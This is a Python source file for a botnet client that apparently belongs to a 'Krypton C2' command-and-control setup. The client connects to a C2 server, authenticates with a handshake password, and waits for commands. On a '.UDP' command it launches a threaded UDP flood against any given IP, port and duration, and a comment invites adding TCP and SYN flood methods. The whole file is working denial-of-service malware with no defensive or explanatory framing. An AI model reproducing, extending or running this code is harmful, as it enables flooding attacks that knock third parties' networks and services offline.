#!/usr/bin/env python3
import socket
import threading
import os
import sys
import time
import random

C2_HOST = 'localhost'
C2_PORT = 1337
PASSWORD = b'\xff\xff\xff\xff\75'  # bot handshake for Krypton C2

def udp_flood(target, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    print(f"Starting UDP flood on {target}:{port} for {duration}s")
    while time.time() < timeout:
        try:
            sock.sendto(payload, (target, port))
        except:
            continue
    print("UDP flood complete.")

def handle_command(command):
    args = command.split()
    cmd = args[0].upper()

    if cmd == "PING":
        return "PONG"
    elif cmd == ".UDP" and len(args) >= 4:
        ip = args[1]
        port = int(args[2])
        time_sec = int(args[3])
        threading.Thread(target=udp_flood, args=(ip, port, time_sec)).start()
        return f"UDP started on {ip}:{port} for {time_sec}s"
    # Add more method handlers here like .TCP, .SYN, etc.
    else:
        return f"Unknown command: {cmd}"

def bot_main():
    try:
        s = socket.socket()
        s.connect((C2_HOST, C2_PORT))
        s.send(PASSWORD)

        while True:
            data = s.recv(4096)
            if not data:
                break
            command = data.decode().strip()
            response = handle_command(command)
            if response:
                try:
                    s.send(response.encode())
                except:
                    pass

    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(10)
        bot_main()  # Retry connection

if __name__ == "__main__":
    bot_main()
